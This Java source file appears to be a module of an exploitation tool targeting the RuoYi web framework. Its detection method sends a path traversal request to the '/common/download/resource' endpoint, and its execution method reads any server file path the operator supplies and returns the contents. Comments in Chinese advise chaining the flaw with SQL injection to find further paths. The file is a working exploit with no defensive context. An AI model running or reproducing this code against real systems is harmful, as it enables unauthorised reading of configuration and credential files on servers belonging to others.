package com.ruoyi.ruoyigui.exploit;

import com.ruoyi.ruoyigui.common.BasePayload;
import com.ruoyi.ruoyigui.entity.Result;
import com.ruoyi.ruoyigui.util.CustomHttpClient;

public class ruoyi_download_resource_fileread implements BasePayload {
    @Override
    public Result checkVUL(String url) throws Exception {
        String CheckStr = "filename";
        String vul_uri = url + "/common/download/resource?resource=/profile/../../../../../";
        try {
            CustomHttpClient req = new CustomHttpClient();
            CustomHttpClient.HttpResponse res = req.get(vul_uri);

            if (String.valueOf(res.getHeaders()).contains(CheckStr)) {
                return new Result(true, "Ruoyi download resource fileread漏洞", "[任意文件读取]\nURI:" + vul_uri);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return new Result(false, "Ruoyi download resource fileread漏洞", null);
    }

    @Override
    public Result exeVUL(String url, String cmd) throws Exception {
        String vul_uri = url + "/common/download/resource?resource=/profile/../../../../../../.." + cmd;
        try {
            CustomHttpClient req = new CustomHttpClient();
            String res = req.get(vul_uri).getBody();
            if (res.isEmpty()) {
                return new Result(true, null, "此漏洞在windows中只能读取配置路径所在磁盘文件，如不存在的文件返回结果为空，建议配合sql注入漏洞返回路径进行读取暴漏的jar路径");
            } else {
                return new Result(true, null, res);
            }
        } catch (Exception e) {
            return new Result(false, null, "执行失败有可能是文件太大，请手动访问:" + url);
        }
    }

    @Override
    public Result getShell(String url) throws Exception {
        return new Result(false, null, null);
    }
}
